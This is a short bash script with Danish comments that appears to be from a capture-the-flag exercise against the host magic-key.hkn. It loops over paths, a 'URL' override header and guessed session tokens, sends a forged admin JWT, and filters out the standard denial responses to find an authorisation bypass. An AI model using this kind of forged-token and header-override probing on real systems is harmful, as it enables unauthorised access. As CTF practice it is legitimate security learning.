#!/bin/bash
# Systematisk test af header-kombinationer mod magic-key.hkn
# Baseret paa pcap-fundet: Session-Token + URL-header kan vaere et path-override/routing-trick

JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoxMzAwMDAwMDAwfQ.d-H00PqEmUozSDiQxSRWBYeyIqvuaTifVVBHlKaE2Wc"

OUTER_PATHS=("/" "/next_chars" "/flag" "/keycheck")
URL_HEADERS=("/flag" "/next_chars" "/keycheck" "/")
TOKENS=("very-good-session-token" "good-session-token")

for outer in "${OUTER_PATHS[@]}"; do
  for urlhdr in "${URL_HEADERS[@]}"; do
    for tok in "${TOKENS[@]}"; do
      code=$(curl -s -o /tmp/resp_body -w "%{http_code}" "http://magic-key.hkn${outer}" \
        -H "Session-Token: ${tok}" \
        -H "URL: ${urlhdr}" \
        -H "JWT: ${JWT}")
      body=$(cat /tmp/resp_body)
      # Kun print hvis det IKKE er den kendte standard-403/401 fejltekst (filtrer stoej)
      if ! echo "$body" | grep -q "This is not part of the challenge\|You do not have permission\|Unauthorized access"; then
        echo "=== [$code] outer=$outer URL-hdr=$urlhdr token=$tok ==="
        echo "$body" | head -5
        echo "---"
      fi
    done
  done
done
echo "Faerdig. Hvis intet blev printet ovenfor, gav alle kombinationer standard-fejl."
